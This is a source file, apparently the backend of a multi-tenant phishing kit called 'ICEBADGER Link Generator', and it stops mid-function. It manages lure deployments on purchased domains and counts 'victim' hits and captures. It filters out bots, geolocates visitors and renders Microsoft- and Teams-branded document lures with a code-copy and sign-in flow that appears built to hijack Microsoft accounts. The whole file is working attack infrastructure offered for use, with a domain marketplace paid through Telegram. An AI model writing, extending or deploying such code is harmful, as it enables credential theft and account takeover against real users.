# ── deployments.py ──────────────────────────────────────────────────────────
# Phase 2: All deployment-related backend logic for ICEBADGER Link Generator.
# ────────────────────────────────────────────────────────────────────────────
import sqlite3, json, logging, requests, re, xml.etree.ElementTree as ET
from datetime import datetime
from config import Config
import assets

logger = logging.getLogger(__name__)

# Default landing background. Served as a cacheable static file instead of a
# 253 KB base64 data URI inlined into every page. Relative, like the rest of the
# app's asset references — landings are served by this same app, so it resolves
# on custom deployment domains too.
DEFAULT_BG_URL = '/static/img/default-bg.jpeg'

# ═══════════════════════════════════════════════════════════════════════════
# DB helpers
# ═══════════════════════════════════════════════════════════════════════════

import contextlib

@contextlib.contextmanager
def _conn():
    c = sqlite3.connect(Config.DB_PATH)
    c.row_factory = sqlite3.Row
    try:
        with c:
            yield c
    finally:
        c.close()

# ─── Pre-land templates ─────────────────────────────────────────────────────
def get_preland_templates(owner_id=None):
    with _conn() as c:
        if owner_id is not None:
            rows = c.execute('SELECT * FROM preland_templates WHERE owner_id = ? ORDER BY category, name', (owner_id,)).fetchall()
        else:
            rows = c.execute('SELECT * FROM preland_templates WHERE owner_id IS NULL ORDER BY category, name').fetchall()
    return [dict(r) for r in rows]

def get_preland_template(tid):
    with _conn() as c:
        row = c.execute('SELECT * FROM preland_templates WHERE id=?', (tid,)).fetchone()
    return dict(row) if row else None

def upsert_preland_template(tid, name, category, description, icon, default_config, html_body=''):
    cfg = json.dumps(default_config) if isinstance(default_config, dict) else default_config
    with _conn() as c:
        if tid:
            c.execute('UPDATE preland_templates SET name=?,category=?,description=?,icon=?,default_config=?,html_body=? WHERE id=?',
                      (name, category, description, icon, cfg, html_body, tid))
        else:
            c.execute('INSERT INTO preland_templates (name,category,description,icon,default_config,html_body) VALUES (?,?,?,?,?,?)',
                      (name, category, description, icon, cfg, html_body))
            tid = c.lastrowid
    return tid

# ─── Owned domains ──────────────────────────────────────────────────────────
def get_owned_domains(owner_id=None):
    """Tenant-partitioned domain listing. owner_id=None returns the MASTER's own
    usable domains (marketplace inventory excluded); a client_id returns that
    tenant's private domains."""
    with _conn() as c:
        if owner_id is None:
            rows = c.execute("""SELECT * FROM owned_domains
                                WHERE status != 'deleted' AND owner_id IS NULL
                                  AND (for_sale IS NULL OR for_sale = 0)
                                ORDER BY domain""").fetchall()
        else:
            rows = c.execute("SELECT * FROM owned_domains WHERE status != 'deleted' AND owner_id = ? ORDER BY domain",
                             (owner_id,)).fetchall()
    return [dict(r) for r in rows]

def get_marketplace_domains():
    """Marketplace inventory with pending-buyer identity for master review."""
    with _conn() as c:
        rows = c.execute("""SELECT od.*, o.username AS pending_buyer
                            FROM owned_domains od
                            LEFT JOIN operators o ON o.id = od.pending_client_id
                            WHERE od.status != 'deleted' AND od.for_sale = 1
                            ORDER BY od.domain""").fetchall()
    return [dict(r) for r in rows]

def get_deleted_domains(owner_id='__all__'):
    """Archived (soft-deleted) domains. owner_id scopes the view per tenant;
    '__all__' (legacy default) returns everything for master administration."""
    with _conn() as c:
        if owner_id == '__all__':
            rows = c.execute("SELECT * FROM owned_domains WHERE status = 'deleted' ORDER BY deleted_at DESC").fetchall()
        else:
            rows = c.execute("SELECT * FROM owned_domains WHERE status = 'deleted' AND owner_id IS ? ORDER BY deleted_at DESC",
                             (owner_id,)).fetchall()
    return [dict(r) for r in rows]

def _clean_domain(domain):
    if not domain:
        return ''
    d = str(domain).strip().lower()
    d = re.sub(r'^https?://', '', d)
    d = d.split('/')[0].strip()
    return d

def add_owned_domain(domain, registrar='dynadot', expiry_date=None, ns_configured=0, owner_id=None, for_sale=0, price=None):
    clean = _clean_domain(domain)
    if not clean:
        return
    with _conn() as c:
        c.execute('''INSERT INTO owned_domains (domain, registrar, expiry_date, ns_configured, status, owner_id, for_sale, price)
                     VALUES (?, ?, ?, ?, 'active', ?, ?, ?)
                     ON CONFLICT(domain) DO UPDATE SET status='active', registrar=excluded.registrar, deleted_at=NULL,
                       owner_id=excluded.owner_id, for_sale=excluded.for_sale, price=excluded.price''',
                  (clean, registrar, expiry_date, ns_configured, owner_id, 1 if for_sale else 0, price))

def transfer_domain_to_client(domain, client_id):
    """Marketplace purchase / admin assignment: ownership transfers to the tenant
    and the domain leaves the sellable inventory entirely."""
    clean = _clean_domain(domain)
    with _conn() as c:
        c.execute("UPDATE owned_domains SET owner_id=?, for_sale=0, price=NULL, pending_client_id=NULL WHERE domain=?", (client_id, clean))
        return c.execute("SELECT changes()").fetchone()[0] > 0

def request_marketplace_domain(domain, client_id):
    """Subscriber clicks Buy: flags the listing as pending for that buyer so the
    master sees the request; the actual transfer happens on master assignment.
    Returns (ok, listed_price)."""
    clean = _clean_domain(domain)
    with _conn() as c:
        cur = c.execute("""UPDATE owned_domains SET pending_client_id=?
                           WHERE domain=? AND for_sale=1 AND status != 'deleted' AND pending_client_id IS NULL""",
                        (client_id, clean))
        price = None
        if cur.rowcount > 0:
            row = c.execute("SELECT price FROM owned_domains WHERE domain=? AND pending_client_id=?",
                            (clean, client_id)).fetchone()
            price = row[0] if row else None
        c.commit()
        return cur.rowcount > 0, price

def get_marketplace_telegram_contact():
    """Master's Telegram handle where marketplace payments are completed."""
    import os
    try:
        cfg_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'settings.json')
        with open(cfg_path, 'r', encoding='utf-8') as f:
            cfg = json.load(f)
        return (cfg.get('marketplace_telegram_contact') or '').strip()
    except Exception:
        return ''

def return_domain_to_marketplace(domain, price=None):
    """Unassign / revoke: the domain goes back into the marketplace inventory."""
    clean = _clean_domain(domain)
    with _conn() as c:
        c.execute("UPDATE owned_domains SET owner_id=NULL, for_sale=1, price=? WHERE domain=?", (price, clean))
        return c.execute("SELECT changes()").fetchone()[0] > 0

def withdraw_marketplace_domain(domain):
    """Master pulls a listing out of the marketplace — it becomes his own domain again."""
    clean = _clean_domain(domain)
    with _conn() as c:
        c.execute("UPDATE owned_domains SET for_sale=0, price=NULL WHERE domain=? AND owner_id IS NULL", (clean,))
        return c.execute("SELECT changes()").fetchone()[0] > 0

def delete_owned_domain(domain, owner_id='__all__'):
    clean = _clean_domain(domain)
    orig = str(domain).strip().lower()
    with _conn() as c:
        # Scoped soft-delete: master retires master/marketplace rows; a tenant can
        # only retire their own private domains.
        if owner_id == '__all__':
            c.execute("""UPDATE owned_domains SET status='deleted', deleted_at=CURRENT_TIMESTAMP
                         WHERE (domain=? OR domain=? OR domain=?) AND owner_id IS NULL""",
                      (clean, orig, f"https://{clean}"))
        else:
            c.execute("""UPDATE owned_domains SET status='deleted', deleted_at=CURRENT_TIMESTAMP
                         WHERE (domain=? OR domain=? OR domain=?) AND owner_id = ?""",
                      (clean, orig, f"https://{clean}", owner_id))

def purge_owned_domain(domain, owner_id='__all__'):
    clean = _clean_domain(domain)
    orig = str(domain).strip().lower()
    with _conn() as c:
        if owner_id == '__all__':
            c.execute("DELETE FROM owned_domains WHERE domain=? OR domain=? OR domain=?",
                      (clean, orig, f"https://{clean}"))
        else:
            c.execute("DELETE FROM owned_domains WHERE (domain=? OR domain=? OR domain=?) AND owner_id = ?",
                      (clean, orig, f"https://{clean}", owner_id))

def purge_all_archived(owner_id='__all__'):
    with _conn() as c:
        if owner_id == '__all__':
            c.execute("DELETE FROM owned_domains WHERE status IN ('deleted', 'retired')")
            c.execute("DELETE FROM deployment_hits WHERE deployment_id IN (SELECT id FROM deployments WHERE status IN ('deleted', 'killed'))")
            c.execute("DELETE FROM deployments WHERE status IN ('deleted', 'killed')")
        else:
            c.execute("DELETE FROM owned_domains WHERE status IN ('deleted', 'retired') AND owner_id = ?", (owner_id,))
            c.execute("""DELETE FROM deployment_hits WHERE deployment_id IN
                         (SELECT id FROM deployments WHERE status IN ('deleted', 'killed') AND owner_id = ?)""", (owner_id,))
            c.execute("DELETE FROM deployments WHERE status IN ('deleted', 'killed') AND owner_id = ?", (owner_id,))

def restore_owned_domain(domain, owner_id='__all__'):
    clean = _clean_domain(domain)
    orig = str(domain).strip().lower()
    with _conn() as c:
        if owner_id == '__all__':
            c.execute("UPDATE owned_domains SET status='active', deleted_at=NULL WHERE domain=? OR domain=? OR domain=?",
                      (clean, orig, f"https://{clean}"))
        else:
            c.execute("UPDATE owned_domains SET status='active', deleted_at=NULL WHERE (domain=? OR domain=? OR domain=?) AND owner_id = ?",
                      (clean, orig, f"https://{clean}", owner_id))

def mark_domain_ns(domain, configured, owner_id='__all__'):
    clean = _clean_domain(domain)
    with _conn() as c:
        if owner_id == '__all__':
            c.execute('UPDATE owned_domains SET ns_configured=? WHERE domain=?',
                      (1 if configured else 0, clean))
        else:
            c.execute('UPDATE owned_domains SET ns_configured=? WHERE domain=? AND owner_id = ?',
                      (1 if configured else 0, clean, owner_id))

# ─── Deployments ────────────────────────────────────────────────────────────
def _jdump(v):
    return json.dumps(v) if isinstance(v, (dict, list)) else (v or '{}')

def get_deployments(include_deleted=False, only_deleted=False):
    q = '''SELECT d.*,
           pt.name as preland_name, pt.icon as preland_icon,
           lt.name as landing_name, st.name as success_name
           FROM deployments d
           LEFT JOIN preland_templates pt ON d.preland_template_id=pt.id
           LEFT JOIN templates lt ON d.landing_template_id=lt.id
           LEFT JOIN templates st ON d.success_template_id=st.id
           {where}
           ORDER BY d.created_at DESC'''
    if only_deleted:
        where = "WHERE d.status IN ('deleted', 'killed')"
    elif include_deleted:
        where = ''
    else:
        where = "WHERE d.status != 'deleted'"
    with _conn() as c:
        rows = c.execute(q.format(where=where)).fetchall()
    res = []
    for r in rows:
        d = dict(r)
        if not d.get('preland_name') and d.get('preland_config'):
            try:
                pcfg = json.loads(d['preland_config'])
                if pcfg.get('template_name'): d['preland_name'] = pcfg['template_name']
                elif pcfg.get('template'): d['preland_name'] = pcfg['template']
            except: pass
        if not d.get('landing_name') and d.get('landing_config'):
            try:
                cfg = json.loads(d['landing_config'])
                if cfg.get('template_name'): d['landing_name'] = cfg['template_name']
            except: pass
        res.append(d)
    return res

def get_deployment(did):
    with _conn() as c:
        row = c.execute('''SELECT d.*,
                           pt.name as preland_name, pt.icon as preland_icon,
                           pt.default_config as preland_default_config,
                           lt.name as landing_name, st.name as success_name
                           FROM deployments d
                           LEFT JOIN preland_templates pt ON d.preland_template_id=pt.id
                           LEFT JOIN templates lt ON d.landing_template_id=lt.id
                           LEFT JOIN templates st ON d.success_template_id=st.id
                           WHERE d.id=?''', (did,)).fetchone()
    if not row: return None
    d = dict(row)
    if not d.get('preland_name') and d.get('preland_config'):
        try:
            pcfg = json.loads(d['preland_config'])
            if pcfg.get('template_name'): d['preland_name'] = pcfg['template_name']
            elif pcfg.get('template'): d['preland_name'] = pcfg['template']
        except: pass
    if not d.get('landing_name') and d.get('landing_config'):
        try:
            cfg = json.loads(d['landing_config'])
            if cfg.get('template_name'): d['landing_name'] = cfg['template_name']
        except: pass
    return d

def get_deployment_by_path(domain, subdomain, path):
    with _conn() as c:
        row = c.execute(
            "SELECT * FROM deployments WHERE domain=? AND subdomain=? AND path=? AND status='active'",
            (domain.lower(), (subdomain or '').lower(), (path or '').lower())).fetchone()
    return dict(row) if row else None

def _build_url(domain, subdomain='', path=''):
    domain = (domain or '').lower().strip()
    if domain.startswith('http://'):
        domain = domain[7:]
    elif domain.startswith('https://'):
        domain = domain[8:]
    domain = domain.rstrip('/')

    is_local = '127.0.0.1' in domain or 'localhost' in domain
    is_tunnel = any(t in domain for t in ('ngrok', 'loca.lt', 'trycloudflare', 'cloudflare', 'pagekite'))
    proto = 'http://' if (is_local and not is_tunnel) else 'https://'
    if is_tunnel or is_local:
        host = domain
    else:
        host = f'{subdomain}.{domain}' if subdomain else domain
    slug = f'/{path.strip("/")}' if path else ''
    return f'{proto}{host}{slug}'

def count_active_deployments(owner_id):
    """Active + paused links count against a tenant's plan quota."""
    with _conn() as c:
        row = c.execute("SELECT COUNT(*) AS n FROM deployments WHERE owner_id=? AND status IN ('active','paused')",
                        (owner_id,)).fetchone()
        return row['n']

def count_client_domains(client_id):
    """Domains currently owned by a tenant (plan quota basis)."""
    with _conn() as c:
        return c.execute("SELECT COUNT(*) FROM owned_domains WHERE owner_id=? AND status != 'deleted'",
                         (client_id,)).fetchone()[0]

def get_domain_pending_client(domain):
    """Buyer identity if this listing is pending purchase by a subscriber (marketplace flow)."""
    clean = _clean_domain(domain)
    with _conn() as c:
        row = c.execute("SELECT pending_client_id FROM owned_domains WHERE domain=?", (clean,)).fetchone()
        return row[0] if row else None

def create_deployment(data):
    full_url = _build_url(data.get('domain',''), data.get('subdomain',''), data.get('path',''))
    with _conn() as c:
        pre_tid = data.get('preland_template_id')
        p_name = data.get('preland_template_name')
        if p_name in ('None', 'none', '', None) or data.get('preland_enabled') is False:
            pre_tid = None
        elif not pre_tid and p_name:
            row = c.execute("SELECT id FROM preland_templates WHERE name=? LIMIT 1", (p_name,)).fetchone()
            if not row:
                row = c.execute("SELECT id FROM preland_templates WHERE name LIKE ? LIMIT 1", (f"{p_name}%",)).fetchone()
            if row: pre_tid = row['id']

        land_tid = data.get('landing_template_id')
        if not land_tid and data.get('landing_template_name'):
            l_name = data['landing_template_name']
            row = c.execute("SELECT id FROM templates WHERE name=? LIMIT 1", (l_name,)).fetchone()
            if not row:
                row = c.execute("SELECT id FROM templates WHERE name LIKE ? LIMIT 1", (f"{l_name}%",)).fetchone()
            if row: land_tid = row['id']

        succ_tid = data.get('success_template_id')
        if not succ_tid and data.get('success_template_name'):
            s_name = data['success_template_name']
            row = c.execute("SELECT id FROM templates WHERE name=? LIMIT 1", (s_name,)).fetchone()
            if not row:
                row = c.execute("SELECT id FROM templates WHERE name LIKE ? LIMIT 1", (f"{s_name}%",)).fetchone()
            if row: succ_tid = row['id']

        pre_cfg = data.get('preland_config') or data.get('config') or {}
        land_cfg = data.get('landing_config') or {}
        if data.get('landing_template_name'):
            land_cfg['template_name'] = data['landing_template_name']
        succ_cfg = data.get('success_config') or {}
        if data.get('success_template_name'):
            succ_cfg['template_name'] = data['success_template_name']
        land_mode = data.get('landing_mode', 'S')

        cur = c.execute('''INSERT INTO deployments
                     (name,domain,subdomain,path,full_url,preland_template_id,preland_config,
                      landing_template_id,success_template_id,success_url,languages,status,landing_config,landing_mode,success_config,owner_id)
                     VALUES (?,?,?,?,?,?,?,?,?,?,?,'draft',?,?,?,?)''',
                  (data.get('name',''),
                   data.get('domain','').lower(),
                   (data.get('subdomain') or '').lower(),
                   (data.get('path') or '').lower(),
                   full_url,
                   pre_tid,
                   _jdump(pre_cfg),
                   land_tid,
                   succ_tid,
                   data.get('success_url','https://www.office.com/'),
                   _jdump(data.get('languages',['en'])),
                   _jdump(land_cfg),
                   land_mode,
                   _jdump(succ_cfg),
                   data.get('owner_id')))
        return cur.lastrowid

def update_deployment(did, data):
    allowed = {'name','domain','subdomain','path','preland_template_id','preland_config',
               'landing_template_id','success_template_id','success_url','languages',
               'status','preland_html_cache','full_url','deployed_at','victim_hits','victim_captured',
               'landing_config','landing_mode','success_config','owner_id'}
    fields, values = [], []
    for k, v in data.items():
        if k not in allowed: continue
        # Changing the pre-land template or its config invalidates the cached
        # pre-land HTML — otherwise the old template keeps serving.
        if k in ('preland_template_id', 'preland_config') and 'preland_html_cache' not in data:
            data['preland_html_cache'] = ''
        if isinstance(v, (dict, list)): v = json.dumps(v)
        fields.append(f'{k}=?')
        values.append(v)
    if not fields: return
    values.append(did)
    with _conn() as c:
        c.execute(f'UPDATE deployments SET {",".join(fields)} WHERE id=?', values)

def kill_deployment(did):
    with _conn() as c:
        c.execute("UPDATE deployments SET status='killed' WHERE id=?", (int(did),))

def set_deployment_status(did, status):
    """Update status of a deployment (active, paused, killed, deleted)."""
    with _conn() as c:
        c.execute("UPDATE deployments SET status=? WHERE id=?", (status, int(did)))

def soft_delete_deployment(did):
    with _conn() as c:
        c.execute("UPDATE deployments SET status='deleted' WHERE id=?", (did,))

def hard_delete_deployment(did):
    with _conn() as c:
        c.execute('DELETE FROM deployment_hits WHERE deployment_id=?', (did,))
        c.execute('DELETE FROM deployments WHERE id=?', (did,))

def log_hit(deployment_id, visitor_ip, visitor_ua, stage, session_user_code=None, is_bot=0, bot_type=''):
    with _conn() as c:
        try:
            c.execute('INSERT INTO deployment_hits (deployment_id,visitor_ip,visitor_ua,stage,session_user_code,is_bot,bot_type) VALUES (?,?,?,?,?,?,?)',
                      (deployment_id, visitor_ip, visitor_ua, stage, session_user_code, 1 if is_bot else 0, bot_type or ''))
        except sqlite3.OperationalError:
            # Fallback if migration not yet applied
            c.execute('INSERT INTO deployment_hits (deployment_id,visitor_ip,visitor_ua,stage,session_user_code) VALUES (?,?,?,?,?)',
                      (deployment_id, visitor_ip, visitor_ua, stage, session_user_code))

        if is_bot:
            try:
                c.execute('UPDATE deployments SET victim_hits=victim_hits+1, bot_hits=bot_hits+1 WHERE id=?', (deployment_id,))
            except sqlite3.OperationalError:
                c.execute('UPDATE deployments SET victim_hits=victim_hits+1 WHERE id=?', (deployment_id,))
        else:
            try:
                c.execute('UPDATE deployments SET victim_hits=victim_hits+1, human_hits=human_hits+1 WHERE id=?', (deployment_id,))
            except sqlite3.OperationalError:
                c.execute('UPDATE deployments SET victim_hits=victim_hits+1 WHERE id=?', (deployment_id,))

def get_deployment_hits(deployment_id):
    with _conn() as c:
        rows = c.execute('SELECT * FROM deployment_hits WHERE deployment_id=? ORDER BY hit_at DESC', (deployment_id,)).fetchall()
    return [dict(r) for r in rows]

# ═══════════════════════════════════════════════════════════════════════════
# SHARED LANDING ENGINE
# ═══════════════════════════════════════════════════════════════════════════
# SHARED LANDING ENGINE  ─ Modes S / A / B / C  +  Optional Left Panel
# ═══════════════════════════════════════════════════════════════════════════

_MS_LOGO_SVG = (
    '<svg width="16" height="16" viewBox="0 0 21 21" fill="none">'
    '<rect x="1" y="1" width="9" height="9" fill="#F25022"/>'
    '<rect x="11" y="1" width="9" height="9" fill="#7FBA00"/>'
    '<rect x="1" y="11" width="9" height="9" fill="#00A4EF"/>'
    '<rect x="11" y="11" width="9" height="9" fill="#FFB900"/>'
    '</svg>'
)


def _geoip(ip):
    """City + country lookup via ip-api.com (free, no key)."""
    if not ip or ip in ('127.0.0.1', '::1') or ip.startswith(('192.168.', '10.', '172.')):
        return 'Local Network'
    try:
        r = requests.get(
            f'http://ip-api.com/json/{ip}?fields=status,city,country',
            timeout=3
        )
        d = r.json()
        if d.get('status') == 'success':
            city    = d.get('city', '')
            country = d.get('country', '')
            return f"{city}, {country}" if city else country
    except Exception:
        pass
    return 'Unknown Location'


def _landing_css(accent, page_bg, card_bg, has_panel, cfg=None):
    cfg = cfg or {}
    left_color = cfg.get('left_bg_color', accent)
    show_left_bg = cfg.get('show_left_bg_image', True)
    left_img   = cfg.get('left_bg_image') if show_left_bg else ''
    left_bg_css = f"background: url('{left_img}') center/cover no-repeat;" if left_img else f"background: {left_color};"

    show_bg   = cfg.get('show_page_bg_image', cfg.get('show_bg_image', True))
    if show_bg in (False, 'false', '0', 0):
        show_bg = False
    else:
        show_bg = True
    page_img  = cfg.get('page_bg_image') or cfg.get('bg_image') or ''
    if not page_img and show_bg:
        page_img = DEFAULT_BG_URL
    if not show_bg:
        page_img = ''
    raw_blur  = float(cfg.get('page_bg_blur', cfg.get('blur', 8)))
    blur_px   = int(round((raw_blur / 100.0) * 32.0)) if (raw_blur > 0 and page_img and show_bg) else 0

    card_img  = cfg.get('card_bg_image')
    card_bg_css = f"background: url('{card_img}') center/cover no-repeat;" if card_img else f"background: {card_bg};"

    panel_css = (
        '.wrapper{display:flex;align-items:stretch;height:100vh;max-height:100vh;width:100%;overflow:hidden;box-sizing:border-box;position:relative;z-index:1;}'
        f'.left-panel{{width:clamp(220px,26vw,320px);flex-shrink:0;{left_bg_css}display:flex;flex-direction:column;'
        'align-items:center;justify-content:flex-start;padding:clamp(36px,5.5vh,48px) 24px 32px;position:relative;overflow:hidden;z-index:2;box-sizing:border-box;}'
        '.left-panel-dec-1{position:absolute;top:10%;right:-50px;width:130px;height:130px;border-radius:50%;border:16px solid rgba(255,255,255,0.07);pointer-events:none;}'
        '.left-panel-dec-2{position:absolute;bottom:6%;left:-60px;width:180px;height:180px;border-radius:50%;border:22px solid rgba(255,255,255,0.07);pointer-events:none;}'
        '.panel-content{display:flex;flex-direction:column;align-items:center;width:100%;max-width:280px;position:relative;z-index:3;}'
        '.panel-logo-wrap{margin-bottom:12px;display:flex;align-items:center;justify-content:center;}'
        '.panel-title{color:#ffffff;font-size:1.15rem;font-weight:700;letter-spacing:0.01em;text-align:center;margin-bottom:6px;line-height:1.25;}'
        '.panel-desc{color:rgba(255,255,255,0.88);font-size:0.82rem;font-weight:400;line-height:1.45;text-align:center;}'
        '.card-area{flex:1;display:flex;align-items:center;justify-content:center;padding:12px;position:relative;overflow:hidden;height:100vh;max-height:100vh;box-sizing:border-box;}'
        '@media(max-width:580px){.wrapper{flex-direction:column;}.left-panel{width:100%;height:auto;padding:14px 16px;flex-shrink:0;justify-content:flex-start;}.left-panel-dec-1,.left-panel-dec-2{display:none;}.panel-logo-wrap{margin-bottom:4px;}.panel-logo-wrap img,.panel-logo-wrap svg{max-height:30px;}.panel-title{font-size:0.92rem;margin-bottom:2px;}.panel-desc{font-size:0.72rem;}.card-area{height:auto;flex:1;padding:8px;}}'
    ) if has_panel else (
        '.wrapper{display:flex;align-items:center;justify-content:center;height:100vh;max-height:100vh;width:100%;position:relative;overflow:hidden;box-sizing:border-box;z-index:1;}'
        '.card-area{width:100%;height:100vh;display:flex;align-items:center;justify-content:center;padding:12px;position:relative;z-index:2;box-sizing:border-box;}'
    )

    bg_layer_css = f".page-bg-layer, .bg-layer {{ position:fixed; inset:-35px; width:calc(100% + 70px); height:calc(100% + 70px); background:url('{page_img}') center/cover no-repeat; filter:blur({blur_px}px); -webkit-filter:blur({blur_px}px); transform:scale(1.04); z-index:0; pointer-events:none; }}" if (page_img and show_bg) else ""

    return f"""<style>
:root{{--accent:{accent}}}
*{{box-sizing:border-box;margin:0;padding:0}}
html,body{{width:100%;height:100vh;max-height:100vh;overflow:hidden;margin:0;padding:0;box-sizing:border-box;background:{page_bg};font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;position:relative;}}
{panel_css}
{bg_layer_css}
.card{{{card_bg_css}border-radius:16px;box-shadow:0 16px 48px rgba(0,0,0,.12),0 3px 12px rgba(0,0,0,.06),inset 0 1px 0 rgba(255,255,255,0.6);border:1px solid rgba(0,0,0,0.08);padding:clamp(14px, 2.4vh, 22px) clamp(16px, 2.6vw, 24px);max-width:390px;width:94%;max-height:96vh;position:relative;z-index:2;box-sizing:border-box;display:flex;flex-direction:column;justify-content:center;}}
h1{{font-size:1.04rem;font-weight:700;color:#1a1a1a;margin-bottom:4px;text-align:center}}
.h-desc{{font-size:.76rem;color:#666;margin-bottom:10px;line-height:1.45;text-align:center}}
.doc-row{{background:#f8f9fc;border:1px solid #e2e5eb;border-radius:10px;padding:8px 12px;display:flex;align-items:center;gap:10px;margin-bottom:10px;box-shadow:inset 0 1px 2px rgba(0,0,0,0.03);}}
.badge{{background:linear-gradient(135deg, var(--accent), #111122);color:#fff;font-size:.65rem;font-weight:800;padding:3px 8px;border-radius:5px;flex-shrink:0;letter-spacing:0.5px;box-shadow:0 2px 6px rgba(0,0,0,0.16);text-transform:uppercase;}}
.doc-name{{font-size:.82rem;font-weight:600;color:#1a1a1a}}
.doc-sub{{font-size:.69rem;color:#999;margin-top:1px}}
.acct-lbl{{font-size:.62rem;font-weight:700;color:#888;letter-spacing:.08em;text-align:center;margin-bottom:4px}}
.alert-box{{background:#fff4f4;border:1px solid #ffd7d7;border-radius:8px;padding:7px 11px;display:flex;align-items:center;gap:7px;margin-bottom:7px;font-size:.76rem;color:#c0392b;font-weight:500}}
.info-chip{{background:#f0f6ff;border:1px solid #d0e4ff;border-radius:8px;padding:5px 10px;display:flex;align-items:center;gap:7px;margin-bottom:5px}}
.chip-lbl{{font-size:.65rem;color:#888;font-weight:600;min-width:68px}}
.chip-val{{font-size:.76rem;color:#1a1a1a;font-weight:600;font-family:monospace}}
.amount{{font-size:1.7rem;font-weight:800;color:#1a1a1a;text-align:center;margin-bottom:2px}}
.inv-num{{font-size:.72rem;color:#888;text-align:center;margin-bottom:2px}}
.bill-from{{font-size:.76rem;color:#666;text-align:center;margin-bottom:6px}}
.inv-meta{{background:#f7f8fa;border:1px solid #e8e8e8;border-radius:8px;padding:5px 10px;font-size:.66rem;color:#888;text-align:center;letter-spacing:.02em}}
.sender-row{{display:flex;align-items:center;gap:9px;margin-bottom:8px}}
.avatar{{width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg, var(--accent), #222244);color:#fff;display:flex;align-items:center;justify-content:center;font-size:.72rem;font-weight:700;flex-shrink:0;box-shadow:0 2px 6px rgba(0,0,0,0.18);}}
.sender-name{{font-size:.82rem;font-weight:600;color:#1a1a1a}}
.sender-via{{font-size:.68rem;color:#999}}
.doc-detail{{background:#f7f8fa;border:1px solid #e8e8e8;border-radius:8px;padding:7px 11px;display:flex;align-items:center;gap:9px;margin-bottom:7px}}
.doc-title{{font-size:.82rem;font-weight:700;color:#1a1a1a}}
.doc-meta{{font-size:.68rem;color:#999;margin-top:1px}}
.review-pill{{background:var(--accent);color:#fff;font-size:.6rem;font-weight:700;padding:2px 8px;border-radius:10px;flex-shrink:0;margin-left:auto;box-shadow:0 2px 4px rgba(0,0,0,0.12);}}
.divider{{border:none;border-top:1px solid #f0f0f0;margin:8px 0}}
.verify-lbl-top{{font-size:.66rem;font-weight:700;color:#000000;letter-spacing:.08em;text-align:center;margin-bottom:3px}}
.verify-desc{{font-size:.72rem;color:#888;text-align:center;margin-bottom:7px}}
.code-box{{border:1px solid #dcdfe6;border-radius:10px;padding:9px 12px;text-align:center;margin-bottom:8px;background:linear-gradient(180deg, #fafbfc, #f1f4f9);box-shadow:0 2px 8px rgba(0,0,0,0.04), inset 0 1px 0 #ffffff;}}
.code-lbl{{font-size:.58rem;color:#999;letter-spacing:.08em;margin-bottom:2px;font-weight:600}}
.code-val{{font-size:1.52rem;font-weight:800;color:var(--accent);letter-spacing:.18em;font-family:monospace;text-shadow:0 1px 1px rgba(0,0,0,0.04);}}
.copy-btn{{margin-top:4px;border-radius:6px;padding:4px 14px;font-size:.70rem;font-weight:700;cursor:pointer;transition:all .18s ease;display:inline-block;box-shadow:0 2px 6px rgba(0,0,0,0.08);}}
.copy-btn:hover{{transform:translateY(-1px);box-shadow:0 4px 10px rgba(0,0,0,0.14);}}
.copy-btn:active{{transform:translateY(1px);box-shadow:0 1px 3px rgba(0,0,0,0.1);}}
.steps-lbl{{font-size:.64rem;font-weight:700;color:#000000;letter-spacing:.07em;margin-bottom:2px}}
.steps-list{{font-size:.72rem;color:#555;padding-left:14px;line-height:1.6;margin-top:2px}}
.signin-btn{{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:11px;color:#fff;border:none;border-radius:8px;font-size:.88rem;font-weight:700;cursor:pointer;text-decoration:none;margin-top:10px;box-shadow:0 4px 14px rgba(0,0,0,0.22), inset 0 1px 0 rgba(255,255,255,0.2);transition:all .2s ease;}}
.signin-btn:hover{{transform:translateY(-1px);box-shadow:0 6px 20px rgba(0,0,0,0.32);opacity:0.96;}}
.signin-btn:active{{transform:translateY(1px);box-shadow:0 2px 8px rgba(0,0,0,0.18);}}
.verifying-overlay{{display:none;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:26px 14px;animation:fadeInAuth .3s ease forwards;}}
.auth-spinner-wrap{{position:relative;width:64px;height:64px;margin:0 auto 16px;display:flex;align-items:center;justify-content:center;}}
.auth-pulse-ring{{position:absolute;inset:-8px;border-radius:50%;border:3px solid var(--accent);opacity:0.35;animation:pulseRing 1.8s cubic-bezier(0.215, 0.61, 0.355, 1) infinite;}}
.auth-spinner{{width:48px;height:48px;border:4px solid rgba(0,0,0,0.08);border-top-color:var(--accent);border-radius:50%;animation:spinAuth .85s linear infinite;}}
@keyframes spinAuth{{to{{transform:rotate(360deg);}}}}
@keyframes pulseRing{{0%{{transform:scale(0.85);opacity:0.7;}}50%{{transform:scale(1.18);opacity:0.12;}}100%{{transform:scale(0.85);opacity:0.7;}}}}
@keyframes fadeInAuth{{from{{opacity:0;transform:scale(0.97);}}to{{opacity:1;transform:scale(1);}}}}
.verifying-title{{font-size:1.06rem;font-weight:700;color:#1a1a1a;margin-bottom:6px;}}
.verifying-desc{{font-size:0.78rem;color:#555;line-height:1.45;margin-bottom:14px;max-width:320px;}}
.verifying-status{{display:inline-flex;align-items:center;gap:7px;background:rgba(0,0,0,0.04);border:1px solid rgba(0,0,0,0.08);padding:5px 14px;border-radius:20px;font-size:0.73rem;font-weight:600;color:#333;margin-bottom:14px;}}
.status-dot{{width:8px;height:8px;border-radius:50%;background:#107c41;display:inline-block;animation:blinkDot 1.2s infinite;}}
@keyframes blinkDot{{0%,100%{{opacity:1;}}50%{{opacity:0.3;}}}}
.reopen-link{{font-size:0.73rem;color:var(--accent);text-decoration:underline;cursor:pointer;transition:opacity .2s;}}
.reopen-link:hover{{opacity:0.8;}}
</style>"""


def _mode_s_card(cfg, accent, icon_mini=''):
    show_title = cfg.get('show_landing_title', True)
    show_desc  = cfg.get('show_landing_desc', True)
    show_name  = cfg.get('show_doc_name', True)
    show_badge = cfg.get('show_doc_badge', True)
    show_meta  = cfg.get('show_doc_meta', True)

    doc_name = cfg.get('doc_name', 'Service-Agreement.pdf')
    doc_sub  = cfg.get('doc_meta', cfg.get('landing_doc_sub', 'Awaiting signature'))
    badge    = cfg.get('doc_badge', 'PDF')
    tmpl_name = (cfg.get('template_name') or cfg.get('template') or '').lower()
    if badge == 'TEAMS' or 'teams' in tmpl_name:
        if badge in ('TEAMS', 'PDF'):
